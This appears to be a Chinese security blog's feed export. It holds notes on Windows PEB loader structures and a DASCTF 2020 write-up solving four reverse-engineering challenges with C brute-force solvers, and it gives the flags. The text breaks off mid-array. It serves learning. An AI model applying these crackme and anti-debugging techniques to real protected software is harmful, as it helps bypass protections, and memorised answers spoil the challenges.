src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200718103540596.png" alt="image-20200718103540596"></p><h4 id="PEB-Ldr"><a href="#PEB-Ldr" class="headerlink" title="PEB.Ldr"></a>PEB.Ldr</h4><p>PEB.Ldr成员是指向_PEB_LDR_DATA结构体的指针：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">+<span class="number">000</span> Length:Uint4B</span><br><span class="line">+<span class="number">004</span> Initialized:UChar</span><br><span class="line">+<span class="number">008</span> SsHandle:Ptr32 <span class="keyword">void</span></span><br><span class="line">+<span class="number">00</span>c InLoadOrderModuleList:_LIST_ENTRY</span><br><span class="line">+<span class="number">014</span> InMemoryOrderModuleList:_LIST_ENTRY</span><br><span class="line">+<span class="number">01</span>c InInitializationOrderModuleList:_LIST_ENTRY</span><br><span class="line">+<span class="number">024</span> EntryInProgress:Ptr32 <span class="keyword">void</span></span><br><span class="line">+<span class="number">028</span> ShutdownInProgress:UChar</span><br><span class="line">+<span class="number">02</span>c ShutdownThreadId:Ptr32 <span class="keyword">void</span></span><br></pre></td></tr></table></figure><blockquote><p>当模块（DLL）被加载到进程，通过PEB.Ldr成员可以直接获取该模块的加载基地址。</p></blockquote><p>_PEB_LDR_DATA结构体成员中有3个_LIST_ENTRY类型的成员（上面已标出）：<strong>_LIST_ENTRY结构体提供了双向链表的机制</strong>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> *<span class="title">Flink</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> *<span class="title">Blink</span>;</span></span><br><span class="line">&#125;LIST_ENTRY, *PLIST_ENTRY;</span><br></pre></td></tr></table></figure><p>该链表中保存的信息：_LDR_DATA_TABLE_ENTRY结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">LDR_DATA_TABLE_ENTRY</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    PVOID Reserved[<span class="number">2</span>];</span><br><span class="line">    LIST_ENTRY InMemoryOrderLinks;</span><br><span class="line">    PVOID Reserverd[<span class="number">2</span>];</span><br><span class="line">    PVOID DllBase;</span><br><span class="line">    PVOID EntryPoint;</span><br><span class="line">    PVOID Reserved3;</span><br><span class="line">    Unicode_STRING FullDllName;</span><br><span class="line">    Byte Reserved4[<span class="number">8</span>];</span><br><span class="line">    PVOID Reserved5[<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">union</span></span><br><span class="line">    &#123;</span><br><span class="line">        ULONG CheckSum;</span><br><span class="line">        PVOID Reserved6;</span><br><span class="line">    &#125;;</span><br><span class="line">    ULONG TimeDateStamp;</span><br><span class="line">&#125;LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;</span><br></pre></td></tr></table></figure><blockquote><p>每个加载到进程中的DLL模块都有与之对应的_LDR_DATA_TABLE_ENTRY结构体，这些结构体相互链接，最终形成_LIST_ENTRY双向链表。</p></blockquote><h4 id="PEB-ProcessHeap-amp-PEB-NtGlobalFlag"><a href="#PEB-ProcessHeap-amp-PEB-NtGlobalFlag" class="headerlink" title="PEB.ProcessHeap &amp; PEB.NtGlobalFlag"></a>PEB.ProcessHeap &amp; PEB.NtGlobalFlag</h4><p>PEB.ProcessHeap和PEB.NtGlobalFlag（像PEB.BeingDebugged一样）应用于反调试结束。若进程处于调试状态，则ProcessHeap于NtGlobalFlag成员就持有特定值。</p><hr>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;PS：本书将指引你进入美妙又刺激的代码逆向分析世界，开启一段神奇之旅！&lt;/strong&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="读书笔记" scheme="https://www.Bxnop.cn/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>2020年DASCTF六月线上赛</title>
    <link href="https://www.bxnop.cn/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
    <id>https://www.bxnop.cn/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/</id>
    <published>2020-06-26T04:02:19.000Z</published>
    <updated>2020-08-19T06:26:04.307Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse:"></a>Reverse:</h2><h3 id="T0p-Gear"><a href="#T0p-Gear" class="headerlink" title="T0p Gear"></a>T0p Gear</h3><ul><li><p>64位elf文件加了upx壳，脱壳后载入ida中发现伪代码不好看，就直接看汇编。就三个检查函数。</p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200626120857536.png" alt="image-20200626120857536"></p><a id="more"></a></li><li><p>chk1：可以看到，只要知道栈中<strong>rbp-20h</strong>的内容即可。这里直接看或者动调都简单。</p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200626121531469.png" alt="image-20200626121531469"></p></li><li><p>chk2：与ch1同理。</p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200626121844498.png" alt="image-20200626121844498"></p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200626125833587-1593226438013.png" alt="image-20200626125833587"></p></li><li><p>chk3：与上同理。</p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200626121936155.png" alt="image-20200626121936155"></p></li><li><p>最后将得到的数据结合起来即可：<strong>c92bb6a5a6c3009124566d882d4bc7ee</strong></p></li></ul><h3 id="easy-maze"><a href="#easy-maze" class="headerlink" title="easy_maze"></a>easy_maze</h3><ul><li><p>64位elf文件，载入ida中看一下，知道是迷宫题，所以目标是明确的。</p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200626141730876.png" alt="image-20200626141730876"></p></li><li><p>可以知道刚开始列和行都是0，下面找迷宫图。先随便看一个操作函数。</p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200626141924284.png" alt="image-20200626141924284"></p></li><li><p>查看byte_400AE0：把数据提取出来。</p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200626142111607.png" alt="image-20200626142111607"></p></li><li><p>用C语言将图打印出来。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> ida_chars[] =</span><br><span class="line">&#123;</span><br><span class="line">   <span class="number">49</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">49</span>,  <span class="number">49</span>,  <span class="number">49</span>,  <span class="number">49</span>,  <span class="number">35</span>, </span><br><span class="line">   <span class="number">49</span>,  <span class="number">49</span>,  <span class="number">49</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">49</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>, </span><br><span class="line">   <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">49</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">49</span>,  <span class="number">49</span>,  <span class="number">49</span>,  <span class="number">49</span>,  <span class="number">79</span>, </span><br><span class="line">   <span class="number">79</span>,  <span class="number">49</span>,  <span class="number">49</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">49</span>,  <span class="number">79</span>, </span><br><span class="line">   <span class="number">79</span>,  <span class="number">49</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">49</span>,  <span class="number">49</span>,  <span class="number">49</span>,  <span class="number">79</span>, </span><br><span class="line">   <span class="number">79</span>,  <span class="number">49</span>,  <span class="number">49</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">49</span>,  <span class="number">49</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>, </span><br><span class="line">   <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">49</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">49</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>, </span><br><span class="line">   <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">49</span>,  <span class="number">49</span>,  <span class="number">49</span>,  <span class="number">49</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>, </span><br><span class="line">   <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>, </span><br><span class="line">   <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">&#123; </span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">10</span>; j++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c "</span>, ida_chars[<span class="number">10</span>*i+j]);</span><br><span class="line"><span class="built_in">putchar</span>(<span class="number">10</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200626142225682.png" alt="image-20200626142225682"></p></li><li><p>由于0和O不易区别，自己把0换成了1。最后从1绕过O走到#即可。<strong>jkkjjhjjkjjkkkuukukkuuhhhuukkkk</strong> 再mad5加密一下。</p></li></ul><h3 id="Magia"><a href="#Magia" class="headerlink" title="Magia"></a>Magia</h3><p>没看见题目的提示，在找密码的时候所有情况试的。。。</p><ul><li><p>32位PE文件，首先打开看了下， 提示输入一个密码，然后验证。ida中看看。</p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200626205847063.png" alt="image-20200626205847063"></p></li><li><p>接着看下面：</p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200626210117361.png" alt="image-20200626210117361"></p></li><li><p>用限制条件写爆破试试：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, k = <span class="number">0</span>, v5 = <span class="number">0</span>, y = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">33</span>] = &#123;<span class="number">0</span>&#125;, temp = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> v11[] = &#123;<span class="number">14</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">15</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">4</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">15</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">13</span>&#125;;</span><br><span class="line"><span class="keyword">char</span> v43[] = &#123;<span class="number">76</span>, <span class="number">101</span>, <span class="number">96</span>, <span class="number">114</span>, <span class="number">100</span>, <span class="number">73</span>, <span class="number">112</span>, <span class="number">99</span>, <span class="number">108</span>, <span class="number">69</span>, <span class="number">83</span>, <span class="number">97</span>, <span class="number">78</span>, <span class="number">100</span>, <span class="number">72</span>, <span class="number">97</span>&#125;; </span><br><span class="line"><span class="keyword">char</span> v59[] = &#123;<span class="number">51</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">54</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">2</span>, <span class="number">58</span>, <span class="number">44</span>, <span class="number">8</span>, <span class="number">49</span>, <span class="number">11</span>, <span class="number">55</span>, <span class="number">12</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">31</span>; i &gt; v5; i--)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">33</span>; j &lt; <span class="number">127</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>((j &amp; <span class="number">0xf</span>) == v11[i])</span><br><span class="line"><span class="keyword">for</span>(k = <span class="number">33</span>; k &lt; <span class="number">127</span>; k++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>((k &amp; <span class="number">0xf</span>) == v11[v5])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>((k^j) == v59[v5] &amp;&amp; (k&amp;j) == v43[v5])</span><br><span class="line">&#123;</span><br><span class="line">flag[i] = j, flag[v5] = k;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">v5++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(flag);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200626210315055.png" alt="image-20200626210315055"></p></li><li><p>可以看到，情况是不唯一的，不然开始就会是Nep了。先接着往下看看：</p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200626211038037.png" alt="image-20200626211038037"></p></li><li><p>开始找重写的sub_403000()函数。先得到key[14]的所有情况：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> v11[] = &#123;<span class="number">14</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">15</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">4</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">15</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">13</span>&#125;;</span><br><span class="line"><span class="keyword">char</span> v43[] = &#123;<span class="number">76</span>, <span class="number">101</span>, <span class="number">96</span>, <span class="number">114</span>, <span class="number">100</span>, <span class="number">73</span>, <span class="number">112</span>, <span class="number">99</span>, <span class="number">108</span>, <span class="number">69</span>, <span class="number">83</span>, <span class="number">97</span>, <span class="number">78</span>, <span class="number">100</span>, <span class="number">72</span>, <span class="number">97</span>&#125;; </span><br><span class="line"><span class="keyword">char</span> v59[] = &#123;<span class="number">51</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">54</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">2</span>, <span class="number">58</span>, <span class="number">44</span>, <span class="number">8</span>, <span class="number">49</span>, <span class="number">11</span>, <span class="number">55</span>, <span class="number">12</span>&#125;;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">32</span>; i &lt; <span class="number">127</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>((i&amp;<span class="number">0xf</span>) == v11[<span class="number">14</span>])</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">32</span>; j &lt; <span class="number">127</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>((j&amp;<span class="number">0xf</span>) == v11[<span class="number">31</span><span class="number">-14</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(((i^j) == v59[<span class="number">14</span>]) &amp;&amp; ((i&amp;j) == v43[<span class="number">14</span>]))</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c%c "</span>, i, j);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200626211709542.png" alt="image-20200626211709542"></p></li><li><p>因为是成对的，将之前的得到的不唯一的key，指定位置换成这3对字符。然后载入OD，依次试一下，发现当Ox与oX都会报错，而_h正常执行。得到此时的程序状态后dump出来。</p></li><li><p>将dump出的文件，载入ida看一下重写的函数的功能。</p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200626212512352.png" alt="image-20200626212512352"></p></li><li><p>因为没看题目提示，使用之前找key[14]的办法，所有情况解出后看key怎么顺眼。最后得到：<strong>Nep{mircle_and_maho_is_not_free}</strong></p></li><li><p>其实题目给了格式的提示。。。</p></li><li><p>再记录下ida中v35[i] = ……语句的地址，进入OD中下断点，然后输入正确的key，得到最终flag:</p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200626212858460.png" alt="image-20200626212858460"></p></li></ul><h3 id="521"><a href="#521" class="headerlink" title="521"></a>521</h3><ul><li><p>64位elf文件，运行看一下，直接让输入flag然后验证。</p></li><li><p>还是载入ida：</p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200626213538336.png" alt="image-20200626213538336"></p></li><li><p>进入v4 = sub_55FE07F79864(a4, (__int64)&amp;v8)：</p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200626213804986.png" alt="image-20200626213804986"></p></li><li><p>接着看下面：</p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200626214036174.png" alt="image-20200626214036174"></p></li><li><p>上面标黄的是整个题的关键函数，进入：</p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200626214524044.png" alt="image-20200626214524044"></p></li><li><p>ida动调提取出数据表：</p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/102BQ%60SD09NF5_648M8$WH.png" alt="img"></p></li><li><p>最后exp：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ida_chars[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">128</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>,  <span class="number">89</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">35</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">53</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">34</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">  <span class="number">115</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">141</span>, <span class="number">255</span>, </span><br><span class="line">  <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>,  <span class="number">26</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">81</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">93</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">  <span class="number">48</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">232</span>, <span class="number">255</span>, </span><br><span class="line">  <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>,  <span class="number">87</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">38</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span 